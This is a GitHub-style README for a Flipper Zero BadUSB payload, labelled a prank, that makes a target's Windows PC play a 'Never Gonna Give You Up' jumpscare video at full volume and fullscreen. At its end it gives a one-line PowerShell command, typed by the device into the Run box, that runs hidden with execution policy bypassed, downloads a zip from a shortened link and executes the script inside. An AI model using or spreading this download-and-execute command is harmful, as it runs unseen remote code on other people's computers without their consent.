# Never Gonna Give You Up in Flipper Zero - BadUSB ✅

A script used to meme your target.

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Faleff-github%2Fmy-flipper-shits&count_bg=%233C3C3C&title_bg=%233C3C3C&icon=linux.svg&icon_color=%23FFFFFF&title=views&edge_flat=false)](https://github.com/aleff-github/my-flipper-shits)

**Category**: Prank

<div align=center>

<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/logo-repository-2_0.gif" width="600" /><br><img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

This script will meme your target.

A jumpscare video will be downloaded to their temp directory. 

When a mouse movement is detected, that video will be played in the PowerShell console at max volume and fullscreen.

## Getting Started

### Usage
YouTube video - [click here](https://youtube.com/shorts/XRY_MEYQUxA)

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
```
powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'bit.ly/NeverGonnaGiveYouUpWindows' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
```
